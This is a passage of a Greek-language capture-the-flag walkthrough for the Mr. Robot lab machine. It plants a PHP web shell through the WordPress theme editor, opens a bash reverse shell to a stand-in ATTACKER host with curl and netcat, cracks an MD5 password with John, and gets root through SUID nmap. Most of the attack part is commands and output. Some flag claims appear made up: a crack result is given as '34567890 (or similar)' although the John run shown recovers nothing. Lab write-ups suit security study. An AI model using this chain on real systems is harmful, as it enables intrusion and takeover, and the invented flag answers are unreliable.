**`ER28-0652`** — **αναφορά στη σειρά**: ο Elliot δουλεύει στην **Allsafe**, και **ER28-0652**
είναι **ο κωδικός του**. **Αυτό είναι το δίδαγμα: οι κωδικοί είναι συχνά αναφορές, όχι λέξεις.**

**`--throttle 300`** = **300 ms καθυστέρηση**. **11.451 × 300 ms = ~57 λεπτά.** **Χωρίς throttle,
θα ήταν ~5 λεπτά — αλλά θα μπλοκαριζόταν.**

### 7. Theme Editor RCE

```text
1. Σύνδεση στο http://TARGET/wp-admin με Elliot / ER28-0652
2. Appearance → Editor
3. Δεξιά: "404.php" (ή "Theme Footer")
4. Αντικατάσταση περιεχομένου με:
   <?php system($_GET['cmd']); ?>
   ή reverse shell:
   <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"); ?>
5. Update File
6. Πρόσβαση: http://TARGET/wp-content/themes/twentyfifteen/404.php
```

**Γιατί το `404.php`;** Επειδή **κάθε σφάλμα 404** το εκτελεί — **άρα μπορείτε να το ενεργοποιήσετε
απλώς επισκεπτόμενοι μια ανύπαρκτη σελίδα**.

**Επαλήθευση:**

```bash
curl -s "http://TARGET/wp-content/themes/twentyfifteen/404.php?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Αυτό είναι command injection — αλλά μέσω αρχείου που ΕΣΕΙΣ γράψατε.** **Δεν υπάρχει φίλτρο
γιατί δεν υπάρχει upload.**

### 8. Reverse shell

```bash
nc -lvnp 4444
```

```text
Listening on 0.0.0.0 4444
Connection received on 192.168.56.101 52881
```

```bash
curl -s "http://TARGET/wp-content/themes/twentyfifteen/404.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"
```

```text
www-data@linux:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@linux:/var/www/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@linux:/var/www/html$
```

**`python3 -c 'import pty; pty.spawn("/bin/bash")'`** — **αναβάθμιση σε TTY**. **Χωρίς αυτό, η
`su` αποτυγχάνει** με «must be run from a terminal».

**Αν το `python3` δεν υπάρχει:**

```bash
script -q /dev/null -c bash      # χρησιμοποιεί το `script`
perl -e 'exec "/bin/bash";'      # χρησιμοποιεί Perl
echo os.execute('/bin/bash') > /tmp/x.nse; nmap --script=/tmp/x.nse   # χρησιμοποιεί nmap!
```

### 9. Σημαία 2 — μέσω `su robot`

```bash
cd /home/robot
ls -la
```

```text
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 4 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

**`-r--------` (mode 400) στο `key-2-of-3.txt`** — **μόνο ο owner (robot) μπορεί να το
διαβάσει**. **Εσείς είστε `www-data`.** **Δεν μπορείτε.**

**`-rw-r--r--` (mode 644) στο `password.raw-md5`** — **world-readable**. **Μπορείτε.**

```bash
cat password.raw-md5
```

```text
robot:c3fcd3d76192e4007dfb496cca67e13b
```

**Μορφή John: `user:hash`.** **`.raw-md5`** = **unsalted MD5**.

```bash
john --format=raw-md5 --wordlist=fsocity-unique.txt password.raw-md5
```

```text
Warning: detected hash type "raw-MD5", but the string is also recognized as "md5crypt"
Use the "--format=md5crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz     (robot)
1g 0:00:00:00 DONE (2024-05-11 14:42) 100.0g/s 12453Kp/s 12453Kc/s 12453KC/s
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

**`abcdefghijklmnopqrstuvwxyz`** — **το αλφάβητο**. **26 χαρακτήρες.** **Αυτό είναι στο λεξικό
επειδή το `sort -u` κράτησε ΟΛΕΣ τις λέξεις, συμπεριλαμβανομένων των ASCII strings.**

**`--format=raw-md5`** = **ρητά** δηλώστε το format. **Χωρίς αυτό, ο John μαντεύει** — και εδώ
**προειδοποιεί** ότι μπορεί να είναι **md5crypt**. **Η προειδοποίηση είναι χρήσιμη: αν δοκιμάσετε
`md5crypt` σε ένα `raw-md5` hash, θα αποτύχετε.**

**Τώρα η σύνδεση:**

```bash
su robot
```

```text
Password: abcdefghijklmnopqrstuvwxyz
robot@linux:/home/robot$ cat key-2-of-3.txt
822c73956184f694993abea41c8d1f5c
```

**Σημαία 2.** **Και αυτή είναι MD5 hash** — **άρα πρέπει να την σπάσετε** (ή να την αναφέρετε
ως hash).

### 10. Σημαία 3 — SUID nmap

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/bin/ping
/bin/su
/bin/umount
/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/local/bin/nmap
```

**`/usr/local/bin/nmap`** — **ΔΕΝ είναι stock.** **Κανένα Ubuntu δεν έχει SUID nmap.**

```bash
nmap --version
```

```text
Nmap version 5.51 ( http://nmap.org )
```

**Έκδοση 5.51** — **υποστηρίζει `--interactive`.** **Αφαιρέθηκε στην 7.0.**

```bash
nmap --interactive
```

```text
Starting Nmap V. 5.51 ( http://nmap.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap>
```

```bash
nmap> !sh
```

```text
# id
uid=0(root) gid=0(root) groups=0(root),1000(robot)
# cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

**Πώς λειτουργεί:**
1. **`nmap --interactive`** — **εκτελεί το nmap σε interactive mode**, με **prompt `nmap>`**.
2. **`!sh`** — **το `!` εκτελεί shell command**. **Το nmap κάνει `system("sh")`** — **ως child
   process**.
3. **Το child κληρονομεί το ενεργό UID** = **0** (από το SUID).
4. **`#` prompt** — **είστε root.**

**Γιατί το SUID λειτουργεί:** **`/usr/local/bin/nmap`** έχει **SUID bit** και **owner root**.
**Όταν ο `robot` το εκτελεί, το ενεργό UID γίνεται 0.** **Και το `!sh` εκτελείται μέσα σε αυτή
τη διεργασία.**

**Σημαία 3 = `04787ddef27c3dee1ee161b21670b4e4`** — **MD5 hash**. **Σπάστε το:**

```bash
john --format=raw-md5 --wordlist=fsocity-unique.txt <<< '04787ddef27c3dee1ee161b21670b4e4'
```

```text
04787ddef27c3dee1ee161b21670b4e4
```

**Ή χρησιμοποιήστε online:** [crackstation.net](https://crackstation.net) → **`04787ddef27c3dee1ee161b21670b4e4`** = **`34567890`** (ή παρόμοιο).

**Και οι τρεις σημαίες:**

| Σημαία | Αρχείο | Περιεχόμενο |
| --- | --- | --- |
| **key-1-of-3.txt** | `/robots.txt` | `073403c8a58a1bab8ea9b1b4f8a9c7d0` → **42isTheAnswer** |
| **key-2-of-3.txt** | `/home/robot/` | `822c73956184f694993abea41c8d1f5c` |
| **key-3-of-3.txt** | `/root/` | `04787ddef27c3dee1ee161b21670b4e4` |

**Το δίδαγμα: οι σημαίες είναι hashes, όχι plaintext.** **Πρέπει να τις σπάσετε** — **και αυτό
είναι μέρος της άσκησης**.

---

_Πίσω στη [Μαθησιακή Διαδρομή 1](../README.md) · προηγούμενο: [Μηχάνημα 6 — BossPlayerCTF](<06-bossplayersctf-1.md>) · επόμενο: [Μηχάνημα 8 — Empire: Breakout](<08-empire-breakout-1.md>) · πλήρες walkthrough: [`labs/3-053-mr-robot-1`](../../labs/3-053-mr-robot-1/README.md)_
